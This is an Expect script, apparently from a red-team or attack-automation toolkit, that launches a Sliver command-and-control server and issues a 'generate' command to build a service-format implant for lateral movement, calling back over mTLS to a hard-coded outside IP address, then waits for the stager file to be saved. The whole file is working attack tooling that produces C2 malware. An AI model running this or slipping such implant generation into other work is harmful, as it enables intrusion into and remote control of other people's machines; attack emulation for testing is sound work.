#!/usr/bin/expect

if {$argc != 1} {
    puts "Usage: $argv0 <payload_for_lateral_movemt>"
    exit 1
}

set payload_for_lateral_move_ment [lindex $argv 0]
puts $payload_for_lateral_move_ment
# set payload_for_lateral_move_ment "./data/payloads/entitled_kilt"
# puts $payload_for_lateral_move_ment

# Activate Sliver server
spawn sliver-server

# Wait for sliver-server to start (you can adjust the sleep duration as needed)
sleep 0.1

# this following is using for creating payload for lateral movement
send "generate --format service --mtls 18.143.102.216:8080 --save $payload_for_lateral_move_ment\r"

# Wait for the file $payload_for_lateral_move_ment to exist
set timeout 300
expect {
    timeout {
        puts "Error: Timed out waiting for $payload_for_lateral_move_ment to be generated."
        exit 1
    }
    -re {Sliver implant stager saved to: (.+)} {
        set generated_file_path [string trim $expect_out(1,string)]
        puts "\nCreate/Save stager_c at $generated_file_path successfully!"
    }
}

# Now send the exit command
send "exit\r"

# Wait for the process to finish
wait
